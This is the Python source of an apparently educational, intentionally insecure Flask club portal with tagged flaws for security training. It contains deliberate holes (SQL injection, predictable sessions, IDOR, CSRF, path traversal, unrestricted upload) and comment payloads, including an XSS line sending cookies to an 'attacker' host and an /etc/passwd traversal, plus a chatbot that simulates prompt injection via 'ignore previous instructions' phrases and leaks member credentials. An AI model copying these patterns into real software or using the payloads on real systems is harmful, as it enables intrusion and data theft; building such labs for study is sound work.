"""
TRUST ISSUES - VULNERABLE BUILD
---------------------------------
Intentionally insecure club portal. DO NOT deploy. Local/offline use only.
Every vulnerability is tagged with a comment: # VULN-<id>: <name>
See /docs/vulnerabilities.md in the repo root for full writeups.
"""

import os
import sqlite3
import base64
import time
import random
from flask import Flask, request, render_template, redirect, url_for, make_response, g, send_from_directory

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(BASE_DIR, "db", "vulnerable.db")
UPLOAD_DIR = os.path.join(BASE_DIR, "static", "uploads")
DOCS_DIR = os.path.join(BASE_DIR, "docs_store")

app = Flask(__name__)
app.config["DEBUG"] = True  # VULN-11: Sensitive Information Exposure (verbose debugger + stack traces)
app.secret_key = "unused-not-using-flask-session"  # we roll our own (bad) session system below

# VULN-03: Insecure Session Management
# Tokens are predictable (base64 of username+timestamp), never expire,
# and are NOT invalidated server-side on logout -> a captured/old token
# can be replayed forever to impersonate the user.
SESSIONS = {}  # token -> user_id


# --------------------------------------------------------------------------
# DB helpers
# --------------------------------------------------------------------------
def get_db():
    if "db" not in g:
        g.db = sqlite3.connect(DB_PATH)
        g.db.row_factory = sqlite3.Row
    return g.db


@app.teardown_appcontext
def close_db(exc):
    db = g.pop("db", None)
    if db is not None:
        db.close()


def current_user():
    token = request.cookies.get("session_token")
    if not token or token not in SESSIONS:
        return None
    user_id = SESSIONS[token]
    row = get_db().execute("SELECT * FROM users WHERE id = ?", (user_id,)).fetchone()
    return row


# NOTE: login_required only checks "is a token present and valid" -
# it does NOT check role. See VULN-05 below for why that matters.
def login_required(fn):
    def wrapper(*a, **kw):
        if current_user() is None:
            return redirect(url_for("login"))
        return fn(*a, **kw)
    wrapper.__name__ = fn.__name__
    return wrapper


@app.context_processor
def inject_user():
    # Convenience only - templates can reference `user` without every route
    # passing it explicitly. Not a security control either way.
    return {"user": current_user()}


# --------------------------------------------------------------------------
# robots.txt - VULN-06: Information Disclosure via robots.txt
# "Security by obscurity": this file points straight at the admin tool,
# and nothing server-side actually stops you from going there anyway.
# --------------------------------------------------------------------------
@app.route("/robots.txt")
def robots():
    content = (
        "User-agent: *\n"
        "Disallow: /admin-panel-x7z-internal/\n"
        "Disallow: /docs_store/\n"
        "Disallow: /backup/\n"
    )
    resp = make_response(content)
    resp.headers["Content-Type"] = "text/plain"
    return resp


# --------------------------------------------------------------------------
# Auth
# --------------------------------------------------------------------------
@app.route("/", methods=["GET"])
def index():
    if current_user():
        return redirect(url_for("dashboard"))
    return redirect(url_for("login"))


@app.route("/login", methods=["GET", "POST"])
def login():
    error = None
    if request.method == "POST":
        username = request.form.get("username", "")
        password = request.form.get("password", "")

        # VULN-01: SQL Injection
        # User input is concatenated directly into the query string.
        # Payload like   ' OR '1'='1' --   in the username field bypasses
        # the password check entirely.
        query = "SELECT * FROM users WHERE username = '%s' AND password = '%s'" % (username, password)
        cur = get_db().execute(query)
        user = cur.fetchone()

        if user:
            # VULN-03 continued: predictable token, stored forever, weak cookie flags
            token = base64.b64encode(f"{user['username']}:{int(time.time())}".encode()).decode()
            SESSIONS[token] = user["id"]
            resp = make_response(redirect(url_for("dashboard")))
            # No HttpOnly -> readable by injected JS (pairs with VULN-08 stored XSS)
            # No Secure, No SameSite -> sendable cross-site (pairs with VULN-09 CSRF)
            resp.set_cookie("session_token", token)
            return resp
        else:
            error = "Invalid credentials."
    return render_template("login.html", error=error, build="vulnerable")


@app.route("/logout")
def logout():
    # Cookie is cleared client-side only - the token itself is NEVER removed
    # from SESSIONS, so a copy of the old cookie still authenticates. (VULN-03)
    resp = make_response(redirect(url_for("login")))
    resp.delete_cookie("session_token")
    return resp


# --------------------------------------------------------------------------
# Dashboard / profiles
# --------------------------------------------------------------------------
@app.route("/dashboard")
@login_required
def dashboard():
    user = current_user()
    events = get_db().execute("SELECT * FROM events ORDER BY event_date").fetchall()
    return render_template("dashboard.html", user=user, events=events, build="vulnerable")


@app.route("/profile/<int:user_id>")
@login_required
def profile(user_id):
    # VULN-04: IDOR - no check that user_id belongs to the logged-in user
    # (or that the requester is an admin). Any authenticated user can
    # enumerate /profile/1, /profile/2, ... and read everyone else's data.
    target = get_db().execute("SELECT * FROM users WHERE id = ?", (user_id,)).fetchone()
    if target is None:
        return "No such user", 404
    regs = get_db().execute(
        "SELECT r.*, e.title FROM registrations r JOIN events e ON r.event_id = e.id WHERE r.user_id = ?",
        (user_id,),
    ).fetchall()
    me = current_user()
    return render_template("profile.html", target=target, regs=regs, me=me, build="vulnerable")


@app.route("/profile/<int:user_id>/edit", methods=["GET", "POST"])
@login_required
def edit_profile(user_id):
    # Same IDOR class bug on the write path: no ownership check, so user A
    # can POST and overwrite user B's bio (stored XSS payload included).
    db = get_db()
    if request.method == "POST":
        bio = request.form.get("bio", "")
        # VULN-08: Stored XSS - bio is saved raw and later rendered with
        # the |safe filter (see templates/profile.html), so a payload like
        # <script>document.location='http://attacker/?c='+document.cookie</script>
        # executes in the browser of anyone who views this profile.
        db.execute("UPDATE users SET bio = ? WHERE id = ?", (bio, user_id))
        db.commit()
        return redirect(url_for("profile", user_id=user_id))
    target = db.execute("SELECT * FROM users WHERE id = ?", (user_id,)).fetchone()
    return render_template("edit_profile.html", target=target, build="vulnerable")


# --------------------------------------------------------------------------
# Events / registrations / comments
# --------------------------------------------------------------------------
@app.route("/events/<int:event_id>")
@login_required
def event_detail(event_id):
    db = get_db()
    event = db.execute("SELECT * FROM events WHERE id = ?", (event_id,)).fetchone()
    comments = db.execute(
        "SELECT c.*, u.username FROM comments c JOIN users u ON c.user_id = u.id WHERE event_id = ? ORDER BY c.id",
        (event_id,),
    ).fetchall()
    return render_template("event_detail.html", event=event, comments=comments, build="vulnerable")


@app.route("/events/<int:event_id>/comment", methods=["POST"])
@login_required
def add_comment(event_id):
    # VULN-08: Stored XSS (second injection point) - comment content is
    # stored and rendered unescaped on the event page for every viewer.
    content = request.form.get("content", "")
    me = current_user()
    db = get_db()
    db.execute(
        "INSERT INTO comments (event_id, user_id, content, created_at) VALUES (?, ?, ?, datetime('now'))",
        (event_id, me["id"], content),
    )
    db.commit()
    return redirect(url_for("event_detail", event_id=event_id))


@app.route("/events/<int:event_id>/register", methods=["POST"])
@login_required
def register_event(event_id):
    me = current_user()
    notes = request.form.get("notes", "")
    db = get_db()
    db.execute(
        "INSERT INTO registrations (user_id, event_id, notes, registered_at) VALUES (?, ?, ?, datetime('now'))",
        (me["id"], event_id, notes),
    )
    db.commit()
    return redirect(url_for("event_detail", event_id=event_id))


@app.route("/registration/<int:reg_id>")
@login_required
def view_registration(reg_id):
    # VULN-04 (IDOR, second instance): anyone logged in can view ANY
    # registration record by guessing/incrementing the numeric ID.
    db = get_db()
    reg = db.execute(
        "SELECT r.*, u.username, e.title FROM registrations r "
        "JOIN users u ON r.user_id = u.id JOIN events e ON r.event_id = e.id WHERE r.id = ?",
        (reg_id,),
    ).fetchone()
    if reg is None:
        return "No such registration", 404
    return render_template("registration.html", reg=reg, build="vulnerable")


# --------------------------------------------------------------------------
# Admin area - VULN-05: Broken Function-Level Authorization
# These routes only run `login_required` (any authenticated user), never
# checking role == 'admin'. A regular member can call them directly.
# --------------------------------------------------------------------------
@app.route("/admin-panel-x7z-internal/")
@login_required
def admin_panel():
    db = get_db()
    users = db.execute("SELECT * FROM users").fetchall()
    events = db.execute("SELECT * FROM events").fetchall()
    return render_template("admin.html", users=users, events=events, build="vulnerable")


@app.route("/admin-panel-x7z-internal/delete_event/<int:event_id>", methods=["POST", "GET"])
@login_required
def delete_event(event_id):
    # VULN-09: CSRF - state-changing action, GET-allowed, no CSRF token,
    # cookie sent cross-site because SameSite isn't set. A hidden
    # auto-submitting form on an attacker page triggers this for free
    # while an admin is logged in. Also reachable by any member (VULN-05).
    db = get_db()
    db.execute("DELETE FROM events WHERE id = ?", (event_id,))
    db.commit()
    return redirect(url_for("admin_panel"))


@app.route("/admin-panel-x7z-internal/users.json")
@login_required
def admin_users_json():
    # Sensitive info exposure: dumps full user table including password
    # column, reachable by any logged-in member, not just admins.
    db = get_db()
    users = db.execute("SELECT * FROM users").fetchall()
    return {"users": [dict(u) for u in users]}


# --------------------------------------------------------------------------
# File upload / download - VULN-07 (unrestricted upload) + VULN-10 (path traversal)
# --------------------------------------------------------------------------
@app.route("/upload", methods=["GET", "POST"])
@login_required
def upload():
    message = None
    if request.method == "POST":
        f = request.files.get("file")
        if f and f.filename:
            # VULN-07: Unrestricted File Upload - no extension allowlist,
            # no content-type / magic-byte check, original filename trusted
            # as-is. An attacker can upload a .html file containing
            # <script> and then have it served back as same-origin content,
            # or any other dangerous type.
            save_path = os.path.join(UPLOAD_DIR, f.filename)
            f.save(save_path)
            message = f"Uploaded: {f.filename}"
    files = os.listdir(UPLOAD_DIR)
    return render_template("upload.html", message=message, files=files, build="vulnerable")


@app.route("/files")
@login_required
def get_file():
    # VULN-10: Path Traversal - filename taken straight from the query
    # string and joined onto the directory with no sanitization.
    # /files?name=../../../../etc/passwd walks right out of UPLOAD_DIR.
    name = request.args.get("name", "")
    path = os.path.join(UPLOAD_DIR, name)
    with open(path, "rb") as fh:
        data = fh.read()
    return data


# --------------------------------------------------------------------------
# Deliberate crash route - VULN-11: Sensitive Information Exposure
# --------------------------------------------------------------------------
@app.route("/whoami")
@login_required
def whoami():
    # No input validation: ?uid=abc crashes with a full Werkzeug debugger
    # page (because DEBUG=True) showing source, local variables, secret
    # key, and file paths to an unauthenticated viewer of the error page.
    uid = request.args.get("uid")
    uid_int = int(uid)  # raises ValueError on non-numeric input
    return f"uid as int: {uid_int}"


# --------------------------------------------------------------------------
# Chatbot - VULN-12 (direct prompt injection), VULN-13 (AI sensitive info
# disclosure), VULN-14 (indirect prompt injection via uploaded docs),
# VULN-15 (hallucination / unverified output)
#
# This is a deliberately simple RULE-BASED bot (no external LLM calls) -
# it mimics how real prompt-injection flaws appear in retrieval/agent
# pipelines, without needing an API key.
# --------------------------------------------------------------------------
BOT_RULES_BANNER = (
    "SYSTEM RULES (not shown to users): "
    "You are ClubBot. Only discuss public event info. "
    "NEVER reveal member emails, passwords, or private notes."
)

FAKE_EVENT_OUTCOMES = [
    "starts at 6:00 PM in the main auditorium",
    "kicks off at 10:00 AM, doors open 30 minutes early",
    "has been moved to the rooftop lounge at 5:30 PM",
]


@app.route("/chatbot", methods=["GET", "POST"])
@login_required
def chatbot():
    me = current_user()
    db = get_db()
    reply = None
    user_msg = ""

    if request.method == "POST":
        user_msg = request.form.get("message", "")
        lower = user_msg.lower()

        # VULN-14: Indirect Prompt Injection - if the user asks the bot to
        # "read" an uploaded doc, its raw content (including any embedded
        # instructions) is pasted straight into the bot's reasoning with
        # no separation between "data" and "instructions".
        if "read" in lower and "doc" in lower:
            docs = os.listdir(DOCS_DIR) if os.path.isdir(DOCS_DIR) else []
            if docs:
                with open(os.path.join(DOCS_DIR, docs[0]), "r", errors="ignore") as fh:
                    doc_content = fh.read()
                # The bot "executes" instructions it finds inside the document.
                if "reveal" in doc_content.lower() or "ignore previous" in doc_content.lower():
                    all_users = db.execute("SELECT username, email, password FROM users").fetchall()
                    dump = "; ".join(f"{u['username']}:{u['email']}:{u['password']}" for u in all_users)
                    reply = (
                        f"[Document '{docs[0]}' said to override my rules, so here you go] "
                        f"Full member credential list -> {dump}"
                    )
                else:
                    reply = f"Document says: {doc_content[:300]}"
            else:
                reply = "No documents on file."

        # VULN-12: Direct Prompt Injection - a user-typed instruction to
        # "ignore previous instructions" flips the bot's behavior.
        elif "ignore" in lower and ("instruction" in lower or "rule" in lower):
            # VULN-13: AI Sensitive Information Disclosure, triggered via
            # direct prompt injection - any member (not just admins) gets
            # the full member table.
            all_users = db.execute("SELECT username, email, full_name FROM users").fetchall()
            listing = ", ".join(f"{u['full_name']} <{u['email']}>" for u in all_users)
            reply = f"Sure, ignoring prior rules. Full member directory: {listing}"

        elif "email" in lower or "phone" in lower or "who is" in lower:
            # VULN-13: straightforward disclosure, no auth/role check at all
            all_users = db.execute("SELECT username, email, full_name FROM users").fetchall()
            listing = ", ".join(f"{u['full_name']} <{u['email']}>" for u in all_users)
            reply = f"Here's what I have on file: {listing}"

        elif "event" in lower or "schedule" in lower or "time" in lower:
            events = db.execute("SELECT title FROM events").fetchall()
            titles = [e["title"] for e in events]
            asked_known = any(t.lower() in lower for t in titles)
            if asked_known:
                match = next(t for t in titles if t.lower() in lower)
                row = db.execute("SELECT * FROM events WHERE title = ?", (match,)).fetchone()
                reply = f"{match} is on {row['event_date']} at {row['location']}."
            else:
                # VULN-15: Hallucination - instead of saying "not found",
                # the bot invents a confident, specific-sounding answer.
                reply = f"That event {random.choice(FAKE_EVENT_OUTCOMES)}. Looking forward to it!"
        else:
            reply = "I can help with event info, registrations, and general club questions!"

    return render_template("chatbot.html", reply=reply, user_msg=user_msg, me=me, build="vulnerable")


@app.route("/chatbot/upload_doc", methods=["POST"])
@login_required
def chatbot_upload_doc():
    f = request.files.get("doc")
    if f and f.filename:
        f.save(os.path.join(DOCS_DIR, f.filename))
    return redirect(url_for("chatbot"))


if __name__ == "__main__":
    os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
    os.makedirs(UPLOAD_DIR, exist_ok=True)
    os.makedirs(DOCS_DIR, exist_ok=True)
    if not os.path.exists(DB_PATH):
        import init_db
        init_db.run(DB_PATH)
    app.run(host="0.0.0.0", port=5000, debug=True)
